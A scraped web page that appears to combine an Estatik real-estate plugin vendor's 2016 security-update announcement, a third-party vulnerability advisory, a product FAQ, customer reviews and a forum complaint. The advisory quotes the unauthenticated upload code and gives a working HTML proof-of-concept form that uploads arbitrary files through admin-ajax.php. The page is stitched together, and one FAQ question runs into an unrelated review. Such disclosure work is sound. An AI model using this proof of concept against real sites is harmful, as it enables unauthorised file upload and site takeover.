# Estatik released SECURITY update! File Upload Vulnerability Fixed.

Posted by admin

September 24, 2016

It is really great that there are additional resources in WordPress community who can help us with plugin testing and reporting.

As soon as we received **File Upload Vulnerability** report from pluginvulnerabilities.com, we started to work on both versions of Estatik plugin to fix vulnerability. We needed some time to make this properly and thanks to guys from pluginvulnerabilities.com, finally got both versions reviewed and approved. Now any possibility of hacking through Estatik plugin is excluded.

Please read the information below carefully and take this post seriously.

The code changes were made in both versions - [Simple](https://estatik.net/product/estatik-simple/) and [PRO](https://estatik.net/product/estatik-professional/).

We strongly recommend to update your version of the plugin. Do not update the plugin without your website backup and previous plugin version reserved. Please backup your website with  your current host. This will mean you can restore your website if the update causes any problems.

In case if any customization was made by you or Estatik team, please do not hesitate to [contact us](https://estatik.net/contact-us/) when you decide to update. We can provide you with detailed instructions what must be changed in the code. If you prefer us to make these changes, just [request it](https://estatik.net/contact-us/) and we will add necessary code directly to your current version absolutely **free**.

Keep your WordPress real estate site secure!

Besides Estatik PRO 2.4.0 included the next improvements and minor bugs fixes.

### Fixed:

* \* File upload vulnerability fixed
* \* Bootstrap library conflicts removed
* \* upgrade\_wp\_estatik\_  tables removed
* \* Google Maps API issue fixed
* \* Cyrillic issue fixed

### Added:

* \* Captcha to Request info form (PRO)
* \* Date added Yes/No option added to plugin settings (PRO & Simple)

### What if I do not update to latest version?

Without the plugin being updated you risk your website every day. Please keep your plugins up to date to keep your website secure.

Update procedure can be found [here](https://estatik.net/estatik-plugin-documentation/#document-6). If any issues appear or you haven't received an email with Download update link, please drop us a message via chat or [contact us](https://estatik.net/contact-us/) page.

# Arbitrary File Upload Vulnerability in Estatik

As we continue to review old third-party data on hacking attempts to identity more vulnerabilities that hackers have likely already discovered in WordPress plugins we spotted an arbitrary file upload vulnerability in the plugin [Estatik](https://wordpress.org/plugins/estatik/).

Back in June of last year a [request](https://www.abuseipdb.com/check/5.101.219.215) was made for the file /wp-content/plugins/estatik/front\_templates/css/es\_front\_responsive.css, for what was likely a probe for usage of the plugin before exploiting it. Looking over that plugin for any obvious issues we found that in the current version of it, 2.2.5, a file upload capability is accessible without being logged, despite only being intended to be accessed by users logged in as Administrators.

The issue starts with the function es\_prop\_media\_images() being made accessible through WordPress AJAX functionality to those not logged in (in the file /admin\_template/es\_property/es\_property\_functions.php):

| ``` 231  ``` | ``` add_action('wp_ajax_nopriv_es_prop_media_images', 'es_prop_media_images'); ``` |
| --- | --- |

add\_action('wp\_ajax\_nopriv\_es\_prop\_media\_images', 'es\_prop\_media\_images');

In that function the following code saves an uploaded file sent with a request to the AJAX function

| ``` 131 132 133 134 135 136 137  ``` | ``` $image_name = time()."_".$_FILES['es_media_images']['name'][$i];   $sourcePath = $_FILES['es_media_images']['tmp_name'][$i];     $targetPath = $upload_dir['path']."/".$image_name;   move_uploaded_file($sourcePath,$targetPath) ; ``` |
| --- | --- |

$image\_name = time()."\_".$\_FILES['es\_media\_images']['name'][$i];
$sourcePath = $\_FILES['es\_media\_images']['tmp\_name'][$i];
$targetPath = $upload\_dir['path']."/".$image\_name;
move\_uploaded\_file($sourcePath,$targetPath) ;

## Proof of Concept

The following proof of concept will upload the selected  file and put it in the current month’s directory inside of the /wp-content/uploads/ directory. The name of the file in the upload directory with be the time the file was saved as output by the function [time()](http://php.net/manual/en/function.time.php) followed by a “\_” and then name of the as it was uploaded.

Make sure to replace “[path to WordPress]” with the location of WordPress.

```
<html>
<body>
<form action="http://[path to WordPress]/wp-admin/admin-ajax.php" method="POST" enctype="multipart/form-data">
<input type="hidden" name="action" value="es_prop_media_images" />
<input type="file" name="es_media_images[]" />
<input type="submit" value="Submit" />
</form>
</body>
</html>
```
## Timeline

* 7/25/2016 – Developer notified.
* 8/1/2016 – WordPress.org Plugin Directory notified.
* 8/1/2016 – WordPres.org Plugin Directory removes plugin.
* Week of 8/14/2016 – Version 2.3.0 released, which fixes vulnerability, but l[eaves a lesser vulnerability](https://www.pluginvulnerabilities.com/2016/08/19/authenticated-arbitrary-file-upload-vulnerability-in-estatik/).

## FAQ

### Do all Estatik Themes support Estatik 4.0?

No, not all Estatik Themes support Estatik 4.0 version. Currently, only Estatik Realtor Theme supports 4.0 ver. We will also add Portal Theme support. All other themes are incompatible with 4.0 ver. but you still can use it and count on our support.

If you upgraded the plugin using Native Theme, for example, you can deactivate the plugin and install back the previous version. Nothing will be lost.

### After upgrading to 4.0 something is wrong with properties images and pages.

Make sure that you proceeded with Migration properly. (Here)[https://estatik.net/docs-category/migration-from-3-x-to-4-ver/] is our quick guide how you need to migrate your listings and configuration.

Please post your question here at Support forum, or contact us >> http://estatik.net/contact-us/ and we will help you with issues.

### How can I import MLS listings using Estatik plugin?

We developed [Estatik Premium](https://estatik.net/product/estatik-premium-rets/) version for MLS listings import via RETS or RESO Web API.

### When I click on details page it says 404 Error: page not found.

xcellent Plugin and excellent supportThe plugin took a bit of time to set up exactly the way I wanted and required some custom development. Support has helped me on numerous setup issues, and they always respond promptly.
The plugin works as it was designed. I have not encountered any errors or bugs with the plugin. Overall, I’ve been extremely impressed with the product and the support I received throughout the entire process (despite being quite particular). The custom development work was fantastic, and I couldn’t be happier with the outcome. A truly satisfied client!

I had a great experience with the team! The plugin took some time to set it up the way I wanted it, and required me to get some custom dev but I’m very happy with the support I have gotten throughout the whole process (I was rather demanding) and the custom dev they did is awesome. Very happy client.

As someone from Ukraine now living in the USA, it was a true joy to collaborate with such talented Ukrainian professionals. Estatick’s creativity, attention to detail, and dedication to quality exceeded my expectations. Their seamless communication and personalized approach made the entire process stress-free and enjoyable. I’m proud to support Ukrainian talent and highly recommend Estatick to anyone looking for top-tier services. 👏

### [Can’t store cities](https://wordpress.org/support/topic/cant-store-cities/)

[desarrollador](https://profiles.wordpress.org/desarrollador/ "Posts by desarrollador")
November 21, 2024

They can’t store cities and provinces correctly.
This problem has been going on for over 2 years without a solution.
With each plugin update, the entire database of cities and provinces is deleted.
Your website will crash and you will need to spend hours re-entering all the data.
Even if you pay for support, they never fix it.

I did a huge amount of research and work to choose the right plugin to interface with our feed. Estatik worked fine for about 6 months, but it has been nothing but trouble since then. I even paid for the expensive support and their support system stopped working. I have no way to get in touch with them, and I have a site that is not functioning correctly. It’s expensive and not reliable.
